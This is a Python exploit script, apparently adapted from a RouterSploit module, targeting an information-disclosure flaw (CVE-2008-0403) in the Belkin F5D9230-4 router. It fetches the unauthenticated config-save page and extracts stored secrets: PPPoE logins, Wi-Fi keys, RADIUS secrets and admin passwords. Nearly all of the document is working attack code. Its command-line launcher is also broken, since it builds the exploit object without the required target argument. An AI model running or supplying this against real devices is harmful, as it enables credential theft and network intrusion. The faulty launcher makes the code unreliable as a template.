target = ""
# rsf exploit module
# description: Exploits Belkin Wireless G Plus MIMO Router F5D9230-4 information disclosure vulnerability.

import re
import requests

class Exploit:
    __info__ = {
        "name": "Belkin G Info Disclosure",
        "description": "Module exploits Belkin G Plus MIMO Router information disclosure vulnerability.",
        "authors": (
            "DarkFig",  # vulnerability discovery
            "Marcin Bury <marcin[at]threat9.com>",  # routersploit module
        ),
        "references": (
            "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-0403",
            "https://www.exploit-db.com/exploits/4941/",
        ),
        "devices": (
            "Belkin G",
        ),
    }

    def __init__(self, target, port=80):
        self.target = target
        self.port = port

    def run(self):
        response = requests.get(f"http://{self.target}:{self.port}/SaveCfgFile.cgi")
        if response is None:
            return

        var = [
            'pppoe_username',
            'pppoe_password',
            'wl0_pskkey',
            'wl0_key1',
            'mradius_password',
            'mradius_secret',
            'httpd_password',
            'http_passwd',
            'pppoe_passwd'
        ]

        data = []
        for v in var:
            regexp = f'{v}="(.+?)"'

            val = re.findall(regexp, response.text)
            if len(val):
                data.append((v, val[0]))

        if len(data):
            print("Exploit success")
            headers = ("Option", "Value")
            print(headers, data)

        else:
            print("Exploit failed")

    def check(self):
        response = requests.get(f"http://{self.target}:{self.port}/SaveCfgFile.cgi")
        if response is None:
            return False  # target is not vulnerable

        var = [
            'pppoe_username',
            'pppoe_password',
            'wl0_pskkey',
            'wl0_key1',
            'mradius_password',
            'mradius_secret',
            'httpd_password',
            'http_passwd',
            'pppoe_passwd'
        ]

        if any(x in response.text for x in var):
            return True   # target vulnerable

        return False  # target is not vulnerable




import sys

if __name__ == "__main__":
    print("Run script:", __file__)
    if len(sys.argv) < 2:
        print(f"Usage: python3 {sys.argv[0]} <target_ip>")
        sys.exit(1)

    target_ip = sys.argv[1]
    exploit = Exploit()
    exploit.target = target_ip
    exploit.run()
